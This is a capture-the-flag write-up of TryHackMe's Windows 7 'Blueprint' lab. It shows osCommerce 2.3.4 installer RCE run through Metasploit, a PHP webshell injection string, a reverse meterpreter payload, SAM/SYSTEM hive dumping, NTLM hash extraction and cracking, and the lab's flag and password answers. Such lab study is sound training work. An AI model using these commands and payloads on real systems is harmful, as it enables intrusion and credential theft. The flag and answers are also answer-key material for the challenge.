# Blueprint — TryHackMe Writeup

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Windows 7 Home Basic SP1  
**Key Topics:** osCommerce RCE, NTLM Hash Dumping, Unstable Shell Handling  

---

## Reconnaissance

Full port scan with service and OS detection:

```bash
nmap -sC -sV -O -A -p- 10.67.152.103
```

### Open Ports

| Port | Service | Details |
|------|---------|---------|
| 80 | HTTP | Microsoft IIS 7.5 (404 — default page, dead end) |
| 135, 139 | RPC / NetBIOS | Standard Windows services |
| 443 | HTTPS | Apache 2.4.23 + OpenSSL 1.0.2h + PHP 5.6.28, expired self-signed cert |
| 445 | SMB | Windows 7 Home Basic SP1, guest access enabled, signing disabled |
| 3306 | MySQL | MariaDB (unauthorized) |
| 8080 | HTTP | Apache 2.4.23 + PHP 5.6.28, **directory listing enabled** |
| 49152-49165 | RPC | Dynamic high ports |

### Key Observations

- Two web servers on the same machine: IIS on port 80 (empty), Apache on 443/8080 (active).
- SMB exposes hostname **BLUEPRINT**, workgroup WORKGROUP (standalone, not domain-joined).
- Apache on 8080 has `Options +Indexes` enabled — directory listing reveals the application structure immediately.
- The entire stack (Apache 2.4.23, PHP 5.6.28, OpenSSL 1.0.2h) is heavily outdated — classic XAMPP deployment.

## Enumeration

Checking the directory listing on port 8080:

```bash
curl http://10.67.152.103:8080/
```

Response confirms a single directory: `oscommerce-2.3.4/`. The version number is right in the folder name — no further enumeration needed.

**osCommerce 2.3.4** is a PHP e-commerce platform with a well-known vulnerability: the installation script (`/install/install.php`) is left accessible after deployment and allows unauthenticated code execution by injecting PHP into the `configure.php` file via the `DB_DATABASE` parameter.

## Exploitation — osCommerce Installer RCE

### Metasploit Module

```
msfconsole
use exploit/multi/http/oscommerce_installer_unauth_code_exec
set RHOSTS 10.67.152.103
set RPORT 8080
set URI /oscommerce-2.3.4/catalog/install/
set LHOST <attacker IP>
set LPORT 4444
run
```

> **Note:** Default `RPORT` is 80 — must be changed to 8080. Default `URI` is `/catalog/install/` — must include the `/oscommerce-2.3.4/` prefix matching the actual directory structure.

### How the Exploit Works

The install script accepts database configuration parameters via POST and writes them directly into `includes/configure.php` without any sanitization. By injecting PHP code into the `DB_DATABASE` field (e.g., `'); system($_GET['cmd']); //`), the attacker turns the config file into a webshell. This is a **configuration file injection**, not a traditional file upload vulnerability.

### Result

Meterpreter session opened. Payload: `php/meterpreter/reverse_tcp`.

```
meterpreter > getuid
Server username: SYSTEM
```

Immediate SYSTEM access — no privilege escalation required. Apache under XAMPP on Windows 7 runs as NT AUTHORITY\SYSTEM by default.

## Post-Exploitation — Credential Dumping

### The PHP Meterpreter Limitation

PHP Meterpreter does not support the `priv` extension, which means `hashdump` and `getsystem` are unavailable:

```
meterpreter > hashdump
[-] The "hashdump" command requires the "priv" extension to be loaded
meterpreter > load priv
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (php/windows)
```

This is a common pitfall — `priv` only works with native `windows/meterpreter` payloads.

### Workaround: Registry Dump

Since we are already SYSTEM, we can export the SAM and SYSTEM registry hives directly. The interactive `shell` command was unstable (PHP Meterpreter tends to die on interactive channels), so non-interactive `execute` was used instead:

```
meterpreter > execute -f reg.exe -a "save HKLM\\SAM C:\\Windows\\Temp\\sam"
Process 6340 created.
meterpreter > execute -f reg.exe -a "save HKLM\\SYSTEM C:\\Windows\\Temp\\sys"
Process 7020 created.
```

Download the hive files:

```
meterpreter > download C:\\Windows\\Temp\\sam /home/kali/
meterpreter > download C:\\Windows\\Temp\\sys /home/kali/
```

### Extracting Hashes

On the attacker machine:

```bash
impacket-secretsdump -sam /home/kali/sam -system /home/kali/sys LOCAL
```

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

## Cracking the NTLM Hash

The Lab user's NT hash: `30e87bf999828446a1c1209ddde4c450`

**hashcat with rockyou.txt** — Exhausted (password not in wordlist):

```bash
hashcat -m 1000 30e87bf999828446a1c1209ddde4c450 /usr/share/wordlists/rockyou.txt
# Status: Exhausted
```

**CrackStation** (rainbow table lookup) — instant result:

```
30e87bf999828446a1c1209ddde4c450 → googleplus
```

NTLM hashes have no salt, making them vulnerable to precomputed rainbow tables even when dictionary attacks fail.

## Retrieving the Root Flag

The flag file was located on the Administrator's desktop. Due to PHP Meterpreter instability with interactive channels, the same redirect-to-file technique was used:

```
meterpreter > execute -f cmd.exe -a "/c type C:\\Users\\Administrator\\Desktop\\root.txt.txt > C:\\Windows\\Temp\\root.txt"
meterpreter > download C:\\Windows\\Temp\\root.txt /home/kali/
```

> **Note:** The file was named `root.txt.txt` (double extension) — always check with `dir` first.

```
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

## Answers

| Question | Answer |
|----------|--------|
| "Lab" user NTLM hash decrypted | googleplus |
| root.txt | THM{aea1e3ce6fe7f89e10cea833ae009bee} |

## Lessons Learned

### 1. PHP Meterpreter Is Limited
Native Windows Meterpreter (`windows/meterpreter/reverse_tcp`) supports `hashdump`, `getsystem`, `load priv`, and process migration. PHP Meterpreter does not. When targeting Windows with a PHP-based exploit, plan for alternative post-exploitation methods or migrate to a native payload via `msfvenom` + `certutil`.

### 2. Non-Interactive Execution for Unstable Shells
When `shell` drops the connection, `execute -f <binary> -a "<args>"` runs commands without requiring an interactive channel. Redirecting output to a file (`> C:\Windows\Temp\out.txt`) and then downloading it is a reliable pattern for any unstable shell scenario.

### 3. Multiple Cracking Approaches
`rockyou.txt` is not exhaustive. When hashcat reports Exhausted, next steps are: rainbow tables (CrackStation for unsalted hashes like NTLM), rule-based mutations (`best64.rule`, `dive.rule`), or larger wordlists. For NTLM specifically, the lack of salt makes rainbow tables extremely effective.

### 4. Post-Install Cleanup Matters
The entire compromise was possible because the osCommerce `/install/` directory was not removed after deployment. This is a recurring pattern across PHP applications (WordPress setup, Joomla installer, phpMyAdmin setup scripts). Always verify removal of installation artifacts during assessments.

### 5. XAMPP = SYSTEM by Default
XAMPP on Windows runs Apache as SYSTEM out of the box. A webshell or RCE in any application under XAMPP grants maximum privileges immediately, skipping the entire privilege escalation phase. This is a critical misconfiguration finding in any pentest report.
